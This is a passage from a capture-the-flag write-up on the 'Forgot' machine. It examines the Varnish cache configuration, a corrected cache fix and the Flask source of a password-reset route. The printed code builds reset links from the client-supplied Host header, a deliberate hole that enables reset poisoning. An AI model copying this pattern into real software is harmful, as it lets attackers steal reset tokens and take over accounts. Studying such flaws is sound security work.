vcache       945  0.0  0.8 270152 34960 ?        SLl  Feb22   2:42 /usr/sbin/varnishd -j unix,user=vcache -F -a :80 -T localhost:6082 -f /etc/varnish/default.vcl -S /etc/varnish/secret -s malloc,256m            
varnish+    1165  1.0  0.5  86552 21992 ?        Ss   Feb22  37:38 /usr/bin/varnishncsa -a -w /var/log/varnish/varnishncsa.log -D -P /run/varnishncsa/varnishncsa.pid

```

There are two `varnishd` processes (likely to help with scale), called with the following options (from running `varnishd -h`):
- `j unix,user=vcache` - Run with a UNIX jail for the user vcache. This is basically so that if the cache is exploited somehow, the resulting execution won’t lead to much.
- `-F` - Run in the foreground.
- `-a :80` - The address Varnish listens on.
- `-T localhost:6082` - The address of the varnish client management interface.
- `-f /etc/varnish/default.vcl` - The config file.
- `-S /etc/varnish/default.vcl` - This is the secret file that defines how a client authenticates to Varnish.
- `-s malloc,256m` - The storage specification. `malloc` is saying to keep the cached files in memory, up to 256 MB.

Looking at `netstat`, `varnishd` is listening on both 80 and 6082:

```

root@forgot:~# netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1266/mysqld         
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      29744/python3       
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      834/varnishd        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      1450/systemd-resolv 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1264/sshd: /usr/sbi 
tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN      834/varnishd        
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      1266/mysqld         
tcp6       0      0 :::80                   :::*                    LISTEN      834/varnishd        
tcp6       0      0 :::22                   :::*                    LISTEN      1264/sshd: /usr/sbi

```

Python is listening on 8080, which seems like the Flask server.

#### Varnish Config

The `default.vcl` file is the config for Varnish:

```

vcl 4.0;

backend default {
    .host = "127.0.0.1";
    .port = "8080";
}

sub vcl_recv {
        if (req.url ~ "/static") {
            return (hash);
        }
}

sub vcl_backend_response {
        if (bereq.url ~ "/static") {
                set beresp.http.cache-control = "public, max-age=240";
                set beresp.ttl = 1d;
                return (deliver);
            }
}

sub vcl_deliver {
}

```

The `backend default` section defines that the backend is localhost:8080, which I identified as the flask server above.

`sub vcl_recv` defines how Varnish should handle incoming requests, sending any request whose URL contains the string “/static” to the `hash` subroutine. The hash can be defined in this or another `.vcl` file, but that’s not present on Forgot. The default is `vcl_hash`, which is shown [here](https://www.varnish-software.com/developers/tutorials/varnish-builtin-vcl/#4-vcl_hash):

```

sub vcl_hash {
    hash_data(req.url);
    if (req.http.host) {
        hash_data(req.http.host);
    } else {
        hash_data(server.ip);
    }
    return (lookup);
}

```

It uses the URL and Host header to see if the file is already cached.

The `sub vcl_backend_response` section defines how Varnish handles responses from the backend server. Any response whose URL contains the string “/static” will have its cache control headers set to “public, max-age=240”, which tells client browsers that they can cache the response for up to 240 seconds, and `beresp.ttl` sets the cache time in the Varnish cache to 1 day. The `deliver` subroutine is called to deliver the response to the client.

#### Fixing Vulnerability

I’ll ask ChatGPT how I could fix the vulnerability (having given it the config previously):

![image-20230225074848315](https://0xdfimages.gitlab.io/img/image-20230225074848315.png)

It gets part of this wrong. If add this to `default.vcl` and restart the service, it will crash:

```

root@forgot:/etc/varnish# service varnish restart
root@forgot:/etc/varnish# service varnish status
● varnish.service - Varnish HTTP accelerator
     Loaded: loaded (/lib/systemd/system/varnish.service; enabled; vendor preset: enabled)
     Active: failed (Result: exit-code) since Sat 2023-02-25 12:46:19 UTC; 53s ago
       Docs: https://www.varnish-cache.org/docs/6.1/
             man:varnishd
    Process: 33456 ExecStart=/usr/sbin/varnishd -j unix,user=vcache -F -a :80 -T localhost:6082 -f /etc/varnish/default.vcl -S /etc/varnish/secret -s malloc,256m (code=exited, status=2)                          
   Main PID: 33456 (code=exited, status=2)

Feb 25 12:46:19 forgot varnishd[33456]: ...in subroutine "vcl_hash"
Feb 25 12:46:19 forgot varnishd[33456]: ('/etc/varnish/default.vcl' Line 25 Pos 5)
Feb 25 12:46:19 forgot varnishd[33456]: sub vcl_hash {
Feb 25 12:46:19 forgot varnishd[33456]: ----########--
Feb 25 12:46:19 forgot varnishd[33456]: ...which is the "vcl_hash" method
Feb 25 12:46:19 forgot varnishd[33456]: Legal returns are: "fail" "lookup"
Feb 25 12:46:19 forgot varnishd[33456]: Running VCC-compiler failed, exited with 2                       
Feb 25 12:46:19 forgot varnishd[33456]: VCL compilation failed
Feb 25 12:46:19 forgot systemd[1]: varnish.service: Main process exited, code=exited, status=2/INVALIDARGUMENT
Feb 25 12:46:19 forgot systemd[1]: varnish.service: Failed with result 'exit-code'.     

```

The `vcl_hash` function can’t return `hash`. The valid options are `fail` and `lookup` (as I noted in the default code shown above). I’ll update it to `lookup`:

![image-20230225080255409](https://0xdfimages.gitlab.io/img/image-20230225080255409.png)

Now it works. And when I run the attack the I ran earlier, it doesn’t work.

### Web Server

#### General

The Flask application is located in `/home/diego/app`:

```

root@forgot:/home/diego/app# ls
app.py  flask_session  static  templates

```

The `static` directory has a few static files:

```

root@forgot:/home/diego/app# find static/ -type f
static/images/bg.jpg
static/js/uc.js
static/js/highcharts.js
static/js/5514032.js

```

The various templates used by the site are in `templates`:

```

root@forgot:/home/diego/app# ls templates/
admin.html  escalate.html  forgot.html  home.html  index.html  reset.html  tickets.html

```

`flask_session` holds a *ton* of session files:

```

root@forgot:/home/diego/app# ls flask_session/
00764aa8e23a1822f82bcbdafdf80109  28f40711fbbfd67f2f5127f0ad48fd19  54d9285350c2166853eac13ff345af9b  821c0757acef281badfbe1eccd4a5978  a8f3f0d69d5fc8882dc0d460e5c3a559  dd01147728fbc8b1e6fc99aad25b76d6
01ea0a540c004adfe4279207d915e7ca  29c51cc16b19736b9b490d746af8284f  557dce39a4560a753e64b4812866c9bb  82367f99e1928e170265c25ff1b5221b  a904edcb270e0003823d4b0786186f30  dd3510c8a1e1a0e55fe71e6a284eaf67
0301a34b2e39f5be6f00c578b0104743  2b1300d9332a8e43503563e67d7a7218  557ed64e0d04e828ceb7e897a76de16a  83510bfe27eb847e0be745d3b18a9a9b  a9c12a413534f7c50bc438bc804de7fa  dd403f8fa50863f3530919c8ee60a840
030b58a0a0009b496bb1a733a65f5ead  2b295aaf8a5107e115ace336075165bb  5674ee2cc2622479109fd5d964b7e36a  840d4883b3460dc9b07c7ac893b4dfdb  a9d4b404a40d3f584642ad639dac355c  df180f421bd2d126cfbf84e0b2afacd5
040132d92e249ba741f7847b83b95d35  2b38ddfd4ba6363280f3ce5dc99572c9  56935c98b3d780fa43a3474200ecfa3a  84e1f4fbfc570333e8aaa524490587c5  aa6c4e8db610a08ac8142db9bc9c4530  dfbb96edcdd7942a14810f1012baec4b
041f8ddb642a913af8caec0f34647e31  2bbf113cb313f9610eedff98cc82ee6a  56a13a8973e16c243459690ce8a8df2d  861b402057a649de1151b9d3c973867a  abc1ebfb5fa758054cd011ad276e4a0a  dfe616f6a54ad37a9b93f7ab1154e55a
04ce023931714864e951c19c110b6ede  2d03b222a2dc9434fceae6f6ee8ffe71  573ab9fb73a604d13048b4ce621453f2  86bb1c59ed0ed44a53108aabc5e13c88  ace3a43737f4f5457cf8e92d700e6111  e012b4f29eb3bac2d4c7c61f04c81774
...[snip]...
root@forgot:/home/diego/app# ls -1 flask_session/ | wc -l
502

```

Each is a binary file that holds session data:

```

root@forgot:/home/diego/app# cat flask_session/53c27a3ec82f1009b0ff7788cf470f89 | xxd
00000000: 4788 2264 8005 9513 0000 0000 0000 007d  G."d...........}
00000010: 948c 0475 7365 7294 8c05 6164 6d69 6e94  ...user...admin.
00000020: 732e                                     s.

```

`app.py` is the main application.

#### Wildcard Routes

I identified that both `/tickets` and `/admin_tickets` were set up such that any subdirectories under them returned the same page. In the application, that looks like this:

```

@app.route('/tickets',defaults={'path':''})
@app.route('/tickets/<path:path>')
@login_required
def tickets(path):
        conn.reconnect()
        c = conn.cursor()
        c.execute('select * from tickets')
        r = c.fetchall()
        return render_template('tickets.html',tickets=r)

```

There are two routes for this method. `/tickets` will match on that exact pattern, and sets the `path` variable to the empty string. `/tickets/<path:path>` will match on anything starting with `/tickets/`, passing whatever follows into the method as `path`. Either way, `path` isn’t used.

`/admin_tickets` looks the same:

```

@app.route('/admin_tickets', defaults={'path':''})
@app.route('/admin_tickets/<path:path>')
@login_required
def admin(path):
        conn.reconnect()
        c = conn.cursor()
        c.execute('select username from users where username=%s',(session['user'],))
        if 'admin' not in c.fetchone():
                return redirect('/home?err=ACCESS_DENIED')
        else:
                c.execute('select * from admin_tickets');
                r = c.fetchall()
                return render_template('admin.html',tickets=r)

```

#### Host Header Injection Source

The `/forgot` route is where I’ll expect to find the host header injection:

```

@app.route('/forgot')
def forgot():
        conn.reconnect()
        c = conn.cursor()
        c.execute('select * from users')
        u = c.fetchall()
        users = {}
        for i in u:
                users[i[0]]=generate_password_hash(i[1])
        if request.args.get('username'):
                username = request.args.get('username')
                if username=='admin':
                        return 'Admin password can\'t be reset'
                elif username in users:
                        c = conn.cursor()
                        u = uuid.uuid4().hex
                        token = base64.b64encode(hashlib.sha512((username+'dcFd034sd@$(%*!Jcve85#2)4$@*^'+u).encode('utf-8')).digest())
                        link = 'http://'+request.headers.get('host')+'/reset?token='+urllib.parse.quote_plus(token.decode('utf-8'))
                        c.execute("insert into forgot values(%s,%s,%s,%s)",(token.decode('utf-8'),link,u,username,))
                        conn.commit()
                        return 'Password reset link has been sent to user inbox. Please use the link to reset your password'
                else:
                        return 'Invalid Username'

        return render_template('forgot.html')

```

The vulnerability is located in this code, once it’s verified that there is a username given as a parameter and that username matches an existing user in the DB:

```

                elif username in users:
                        c = conn.cursor()
                        u = uuid.uuid4().hex
                        token = base64.b64encode(hashlib.sha512((username+'dcFd034sd@$(%*!Jcve85#2)4$@*^'+u).encode('utf-8')).digest())
                        link = 'http://'+request.headers.get('host')+'/reset?token='+urllib.parse.quote_plus(token.decode('utf-8'))
                        c.execute("insert into forgot values(%s,%s,%s,%s)",(token.decode('utf-8'),link,u,username,))
                        conn.commit()
                        return 'Password reset link has been sent to user inbox. Please use the link to reset your password'

```

This code is generating a reset link and storing that in the database, and using `request.headers.get('host')` as the host for the link. Presumably in a real application, this code would also email the user, but here user clicking happens via automation.